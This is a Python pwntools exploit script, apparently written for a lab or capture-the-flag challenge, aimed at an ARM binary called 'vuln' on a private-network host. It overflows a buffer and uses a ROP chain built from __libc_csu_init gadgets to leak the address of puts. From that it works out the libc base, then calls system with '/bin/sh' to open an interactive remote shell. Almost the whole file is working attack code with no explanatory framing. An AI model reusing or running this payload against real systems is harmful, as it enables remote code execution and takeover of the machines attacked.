from pwn import *
import time, sys

context.binary = "./vuln"
binary = ELF("./vuln")
p = remote("192.168.0.6", "2323")
prog = log.progress("Remote ARM Exploitation")
'''
0x000105e8: pop {r3, r4, r5, r6, r7, r8, sb, pc};
0x000105d0: mov r0, r7; mov r1, r8; mov r2, sb; blx r3;
0x000104e0: blx r3;
0x105e8 <__libc_csu_init+88> pop    {r3,  r4,  r5,  r6,  r7,  r8,  r9,  pc}
'''
puts = 0x1045c
main_puts = 0x00010554
offset = 0x61478
main = 0x000104f0
got = 0x00020714

exp = "A" * 0x100 + p32(got + 260)
exp += p32(0x105e8) + p32(binary.plt["puts"]) + p32(0) * 3
exp += p32(binary.got["puts"]) + p32(0) * 2 
exp += p32(0x105d0)     # blx -> x86 call instruction... but why cant re-execute main?
exp += p32(main) + p32(0) * 6 + p32(0x105d0)

fp = open("payload", "w")
fp.write(exp)
fp.close()

p.sendline(exp)
p.recvuntil("!\n")
libc_base = u32(p.recv(4)) - offset
system = libc_base + 0x39fac
binsh = libc_base + 0x11db20
log.info("libc_base : " + hex(libc_base))
log.info("system : " + hex(system))

exp2 = p32(0x105e8) + p32(system) + p32(0) * 3 + p32(binsh) + p32(0) * 2 + p32(0x105d0)
p.sendline("C" * 0x100 + "B" * 4 + exp2)

p.interactive()
